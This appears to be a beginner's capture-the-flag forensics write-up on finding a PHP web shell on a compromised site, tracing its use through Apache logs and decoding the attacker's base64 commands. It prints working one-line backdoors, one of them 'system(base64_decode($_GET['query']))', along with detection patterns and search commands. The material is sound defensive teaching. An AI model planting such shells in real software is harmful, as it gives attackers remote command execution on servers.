# Infinity Shell

## 1. Story of the Scenario

A hacker attacked a website.

The hacker found a weakness in the website and uploaded a **web shell**.

A web shell allows the attacker to control the server remotely.

Our job was:
- Investigate the attack
- Find what the attacker did
- Trace attacker actions
- Recover the flag

This process is called **Digital Forensics**.

---

## 2. What is a Web Shell?

A web shell is a small malicious file placed inside a website.

It allows attackers to run system commands from a browser.

Example idea:

Attacker sends command → Server executes it → Output returns.

So the website becomes a remote terminal.

---

## 3. Where Websites Live (Important Concept)

Websites are usually stored inside:

/var/www/html/

This location is called the **Web Root**.

All website files exist here.

So investigation always starts from this folder.

---

## 4. Finding Suspicious Files

Normal website folders should contain:
- images
- css
- html
- php pages

But attackers hide files in strange places.

Example:

img/images.php

Images folder normally should NOT contain PHP files.

This becomes suspicious.

---

## 5. Malicious Code Found

Inside the file we saw:

system(base64_decode($_GET['query']));

Meaning:

1. Attacker sends data using URL.
2. Data is encoded.
3. Server decodes it.
4. Server runs it as a command.

So attacker can control the machine.

This confirms a **Web Shell**.

---

## 6. Why Base64 Encoding?

Attackers hide commands using encoding.

Example:

whoami → encoded text

Encoding hides commands from detection.

Server decodes before execution.

---

## 7. Important Forensics Idea

Even if attacker deletes files,
**logs still remember actions**.

Logs record:
- who connected
- what page opened
- what command was sent

Logs are digital evidence.

---

## 8. Checking Server Logs

Web server logs are stored in:

/var/log/apache2/

Important log file:

access.log  
other_vhosts_access.log

These logs show attacker requests.

---

## 9. Attacker Footprints

Logs contained requests like:

images.php?query=encoded_text

This means attacker executed commands through the shell.

Each "query" value was a command.

---

## 10. Decoding Attacker Commands

Encoded text must be decoded.

After decoding we discovered commands such as:

whoami  
ls  
cat flag.txt  
echo THM{flag}

One decoded command revealed the flag.

---

## 11. Final Investigation Flow

Attack Investigation Steps:

1. Identify website location

From where attack start -->
- Web directories
- upload folders
- unusual php files

2. Search suspicious files

using command :
- find / -name "*.php" 2>/dev/null

suspicious name may have :
- shell
- cmd
- backdoor
- upload

Signs:
- small php file
- eval()
- system()
- exec()
- base64_decode()

We get :
- /var/www/html/CMSsite-master/
  - almost every file come from this directory
  - we get the attack root website 

3. Detect web shell

- Check Recently modified file
   - find /var/www/html -type f -mtime -2
- find /var/www/html -type f -mtime -2
   - Web shells mostly contain:
       - system(
       - exec(
       - shell_exec(
       - passthru(
       - eval(
       - base64_decode(
       - use command
          - grep -R "base64" /var/www/html
 - we must get something like this :
    - <?php system($_GET['cmd']); ?>
             



4. Understand malicious code
- after running the search commands we get :
   - we get the location:
      - /var/www/html/CMSsite-master/img/images.php:
      - <?php system(base64_decode($_GET['query'])); ?>

5. Check server logs
- run command:
   - grep images.php /var/log/apache2/*

6. Find attacker commands
7. Decode commands
8. Recover flag

---

## 12. Key Learning Points

✔ Attackers hide shells in normal folders  
✔ Encoding hides malicious commands  
✔ Logs store attacker activity  
✔ Forensics means following evidence  
✔ Never trust file names or locations  

---

## 13. Golden Rule (Remember Always)

Files can lie.  
Attackers can hide.  
But logs always tell the truth.

---

## 14. Skills Learned

- Web Shell Detection
- Basic Digital Forensics
- Log Analysis
- Incident Investigation
- Command Tracing

---

## End Note

Digital Forensics is like solving a crime.

You do not attack the system.

You study evidence left behind by the attacker.
